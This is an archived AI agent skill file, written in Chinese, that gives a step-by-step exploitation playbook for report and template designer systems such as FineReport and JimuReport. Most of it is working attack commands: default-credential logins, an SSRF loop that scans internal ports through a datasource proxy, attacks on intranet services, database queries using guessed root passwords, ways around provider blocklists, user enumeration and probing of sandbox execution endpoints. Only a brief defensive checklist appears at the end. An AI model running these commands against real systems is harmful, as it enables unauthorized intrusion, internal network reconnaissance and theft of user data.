<!-- archived from /root/.hermes/skills/security/report-designer-ssrf-dbquery/SKILL.md on 2026-10-21 -->

---
name: report-designer-ssrf-dbquery
description: >-
  报表/模板设计器 SSRF + DB Query 利用。
  当目标运行 XTY 模板设计器、帆软 FineReport、
  JimuReport 积木报表、UReport2、润乾报表、
  或任何带 /api/datasource/http/proxy 和 
  /api/datasource/db/query 的报表系统时使用。
  关键词：模板设计器、报表设计器、数据源代理、
  connectionString、dbType、http proxy SSRF、
  禁止连接系统数据库、Keyword not supported port。
---

> 归档卡：原目录 `/root/.hermes/skills/security/report-designer-ssrf-dbquery`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/report-designer-ssrf-dbquery/…')`，不要相对 `references/legacy/` 解析。

# 报表/模板设计器 SSRF + DB Query 利用

## 来源

QXXT 轻序协同案卷（2026-09）实战提取。

## 一、识别指纹

```
# XTY 模板设计器
GET / → HTML 含 "XTY" 或 "模板设计"
POST /api/auth/login → {"code":4002,"message":"用户名和密码不能为空"}
CORS: Access-Control-Allow-Headers: Content-Type, Authorization, X-User-Token

# 帆软 FineReport
GET /decision → 帆软决策平台
/WebReport/ReportServer

# JimuReport 积木报表
GET / → 积木报表
/jmreport/

# 通用报表设计器
存在 /api/datasource/ 路径
存在 /api/template/ 路径
```

## 二、利用链

### 2.1 登录

```bash
# 默认账号
curl -X POST http://target/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# 自注册（如果开放）
curl -X POST http://target/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"probe","password":"probe123","email":"<EMAIL-REDACTED>"}'
```

### 2.2 SSRF — HTTP 代理

```bash
TOKEN="eyJ..."

# 内部端口扫描
for port in 80 3306 6379 8080 9090 27017 5432 8888 9000; do
  r=$(curl -sk --max-time 3 -X POST 'http://target/api/datasource/http/proxy' \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.0.0.1:${port}/\",\"method\":\"GET\"}")
  echo "port=$port -> $(echo $r | python3 -c 'import sys,json;d=json.load(sys.stdin);sd=d.get("data",{});print(f"status={sd.get(\"statusCode\",\"?\")} data={str(sd.get(\"sampleData\",\"\"))[:80]}")' 2>/dev/null)"
done

# 打内网 HTTP 服务
curl -X POST 'http://target/api/datasource/http/proxy' \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://内网IP:端口/api/login","method":"POST","headers":[{"key":"Content-Type","value":"application/json"}],"body":"{\"username\":\"admin\",\"password\":\"admin123\"}"}'
```

> ⚠️ headers 格式是 **列表** `[{"key":"K","value":"V"}]`，不是字典。

### 2.3 DB Query — 数据库查询

```bash
# 先测试连接 + 确认 provider
curl -X POST 'http://target/api/datasource/db/query' \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"connectionString":"Server=127.0.0.1;Port=3306;Database=mysql;User=root;Password=123456","sql":"SELECT 1"}'
```

### 2.4 ⚠️ Provider 切换陷阱（.NET 后端特有）

| 现象 | 原因 | 解法 |
|------|------|------|
| `mysql` 库 → "禁止连接系统数据库" | 黑名单拦截 | 无法绕过 |
| 非系统库 → "Keyword not supported: 'port'" | 切换到 SQL Server provider | 去掉 Port 或用逗号格式 |
| `Server=x,3306` → "Internal connection fatal error" | SQL Server TDS 协议连 MySQL 端口 | 只能连真正的 SQL Server |
| `dbType=mysql` → 仍然报错 | 参数被忽略 | 无法强制 |

**判断 provider 的方法**：
1. 系统库名（mysql/information_schema/sys/master）→ 对应数据库原生 provider
2. 其他库名 → 默认 provider（可能是 SQL Server）
3. 如果报 "Keyword not supported" → 确认是 SQL Server provider

**如果目标实际是 SQL Server**：
```
connectionString: Server=127.0.0.1;Database=业务库;User Id=sa;Password=xxx
# 不要写 Port
```

**如果 provider 不可切换且只有 MySQL**：
- 此接口对业务库无用
- 转向 SSRF 打其他内网 HTTP 服务

## 三、用户枚举

```bash
# 列全部用户
curl -sk 'http://target/api/auth/users' \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# 关注字段：username, phone, email, isAdmin, uid
```

## 四、沙箱引擎

部分报表设计器内含沙箱引擎用于模板渲染：

```bash
# 健康检查
curl via SSRF → http://127.0.0.1:39091/health
# {"code":0,"message":"OK","data":{"status":"alive","uptime":73635}}

# 可能的执行接口
/api/execute
/api/render
/api/eval
```

## 五、防御检测

如果你是防御方：
1. DB Query 接口应强制 provider 参数而非按库名猜
2. SSRF 代理应限制目标为白名单域名
3. 沙箱引擎不应暴露在与主服务同端口
4. 关闭自注册或限制注册域名
5. 默认密码 admin/admin123 必须强制修改
